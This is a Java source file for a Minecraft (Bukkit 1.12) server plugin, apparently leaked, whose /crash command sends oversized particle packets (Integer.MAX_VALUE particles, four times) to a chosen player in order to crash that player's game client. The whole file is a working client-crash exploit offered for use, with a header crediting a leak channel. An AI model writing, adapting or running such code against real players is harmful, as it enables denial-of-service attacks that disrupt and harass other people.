package unkw301.ClientCrashPacket.commands;

import org.bukkit.*;
import org.bukkit.entity.*;
import org.bukkit.command.*;
import net.minecraft.server.v1_12_R1.*;
import org.bukkit.craftbukkit.v1_12_R1.entity.*;

/**
 * Leaked by FlatiCommunity (https://t.me/flaticommunity)
 */

public class CrashCommand implements CommandExecutor {

    @Override
    public boolean onCommand(CommandSender s, Command cmd, String label, String[] args) {
        if(!s.hasPermission("unkw301.crash")){
            s.sendMessage("§cYou dont have enough permissions");
            return true;
        }
        if(args.length == 0){
            s.sendMessage("/crash <Player>");
            return true;
        }
        Player crash = Bukkit.getPlayer(args[0]);
        if(!Bukkit.getOnlinePlayers().contains(crash)){
            s.sendMessage("§cPlayer " + crash.getName() + " not fround!");
            return true;
        }
        PacketPlayOutWorldParticles packet = new PacketPlayOutWorldParticles(EnumParticle.BARRIER, true,
                crash.getLocation().getBlockX(), crash.getLocation().getBlockY(), crash.getLocation().getBlockZ(),
                crash.getLocation().getBlockX()+10, crash.getLocation().getBlockY()+10, crash.getLocation().getBlockZ()+10,
                10, Integer.MAX_VALUE);
        CraftPlayer c = ((CraftPlayer)crash);
        c.getHandle().playerConnection.sendPacket(packet);
        c.getHandle().playerConnection.sendPacket(packet);
        c.getHandle().playerConnection.sendPacket(packet);
        c.getHandle().playerConnection.sendPacket(packet);
        s.sendMessage("§eCrashed " + crash.getName());
        return true;
    }

}
